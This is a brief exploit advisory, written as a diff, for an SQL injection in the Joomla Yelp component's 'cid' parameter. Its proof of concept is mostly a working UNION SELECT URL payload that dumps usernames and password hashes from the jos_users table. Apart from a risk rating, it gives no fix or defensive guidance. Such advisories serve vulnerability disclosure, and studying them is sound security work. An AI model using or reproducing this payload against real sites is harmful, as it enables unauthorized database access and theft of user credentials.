@@ -1,0 +1,27 @@
+[~]>> ...[BEGIN ADVISORY]...
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> TITLE: Joomla (Yelp Component) SQL Injection Vulnerability
+[~]>> LANGUAGE: PHP
+[~]>> RESEARCHER: B-HUNT3|2
+[~]>> CONTACT: bhunt3r[at_no_spam]gmail[dot_no_spam]com
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> DESCRIPTION: Input var cid is vulnerable to SQL Code Injection
+[~]>> AFFECTED VERSIONS: N/A
+[~]>> RISK: Medium/High
+[~]>> IMPACT: Execute Arbitrary SQL queries
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> PROOF OF CONCEPT:
+
+[~]>> http://server/index.php?option=com_yelp&controller=showdetail&task=showdetail&cid=[SQL]
+
+[~]>> http://server/index.php?option=com_yelp&controller=showdetail&task=showdetail&cid=-1+UNION+ALL+SELECT+1,2,3,concat_ws(0x3a3a3a,username,password),5,6,concat_ws(0x3a3a3a,username,password),8,9,10,11,12,13,14,15,16,17+FROM+jos_users--
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+[~]>> ...[END ADVISORY]...
